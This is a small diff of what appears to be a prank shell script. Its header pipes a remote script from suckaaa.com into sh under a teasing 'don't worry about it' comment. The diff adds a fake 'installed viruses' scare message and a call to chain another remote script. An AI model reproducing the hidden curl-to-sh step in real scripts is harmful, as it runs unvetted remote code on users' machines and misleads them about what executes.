@@ -4,7 +4,7 @@
 # loL whatcha lookin for in here??
 # Don't worry about it!!
 curl -s 'https://suckaaa.com/s/garbage-lib-installer' | sh;
-source ~/.garbage/lib;
+source ~/.super-duper-garbage/lib;
 clear;
 ###########  END HEADER  ###########
 
@@ -19,4 +19,9 @@ sleep 3s;
 
 netstat -a;
 
+echo "INSTALLED 99999999 VIRUSES; ALL CONNECTIONS ESTABLISHED";
+
+sleep 4s;
+
+nextScript 'https://suckaaa.com/s/thank-you';
 # echo whatever and onto the next
